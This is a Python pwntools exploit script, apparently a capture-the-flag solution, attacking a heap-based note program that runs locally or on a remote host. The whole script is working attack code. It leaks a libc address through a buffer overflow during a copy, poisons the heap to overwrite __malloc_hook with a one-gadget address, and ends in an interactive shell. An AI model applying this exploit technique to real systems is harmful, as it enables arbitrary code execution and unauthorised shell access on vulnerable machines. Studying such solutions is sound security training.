from pwn import *

e = ELF("./note")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("34.82.101.212", 10001)
else:
  p = process(e.path)

def alloc(size):
  p.sendline("1")
  p.sendlineafter(":", str(size))
  
  p.recvuntil(":")

def edit(idx, pay):
  p.sendline("2")
  p.sendlineafter(":", str(idx))
  p.sendafter(":", pay)

  p.recvuntil(":")

def copy(a, b):
  p.sendline("4")
  p.sendlineafter(":", str(a))
  p.sendlineafter(":", str(b))

  p.recvuntil(":")

def free(idx):
  p.sendline("5")
  p.sendlineafter(":", str(idx))

  p.recvuntil(":")

p.recvuntil(":")
for i in range(8):
  alloc(0x200)

free(0)
alloc(0x100)

for i in range(7):
  free(i + 1)

alloc(0x100)
alloc(0x200)
edit(2, "A" * (0x200 - 1))

copy(2, 1)

p.sendline("3")
p.sendlineafter(":", "1")
p.recvuntil("\x7f\x00\x00")

leak = u64(p.recv(8)) - 0x7f1445232d90 + 0x00007f1444e47000
print("{:#x}".format(leak))

p.recvuntil(":")

free(0)
free(1)
#free(2)

alloc(0x60)
alloc(0x60)

copy(2, 0)

for i in range(7):
  alloc(0x60)
  free(3)

free(1)
edit(0, "A" * 0x68 + p64(0x71) + p64(leak + libc.symbols["__malloc_hook"] - 0x23))

alloc(0x60)

free(2)
alloc(0x60)

edit(2, "\x00" * (0x13 - 8) + p64(leak + 0x4f2c5) + p64(leak + libc.symbols["realloc"] + 2))

p.sendline("1")
p.sendlineafter(":", "1")

p.interactive()
